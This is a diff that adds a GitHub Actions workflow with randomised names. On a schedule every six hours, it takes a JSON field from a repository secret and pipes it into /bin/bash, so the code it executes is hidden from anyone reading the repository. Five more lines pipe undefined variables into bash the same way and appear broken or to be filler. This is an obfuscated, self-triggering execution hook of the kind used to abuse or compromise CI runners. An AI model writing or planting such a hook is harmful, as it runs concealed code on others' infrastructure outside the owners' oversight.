@@ -1,0 +1,23 @@
+name: oingzhishimo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: oingzhishimo
+        env:
+          js66: ${{ secrets.js66 }}
+        run: |
+          echo $js66 | jq -r .aaegy010 | /bin/bash
+          echo $cpp23 | jq -r .hrk384 | /bin/bash
+          echo $auju1220 | jq -r .fdqao528 | /bin/bash
+          echo $dimjv80521 | jq -r .qznft8 | /bin/bash
+          echo $hqtm0361 | jq -r .er5227 | /bin/bash
+          echo $sthdo46563 | jq -r .ij4 | /bin/bash
+
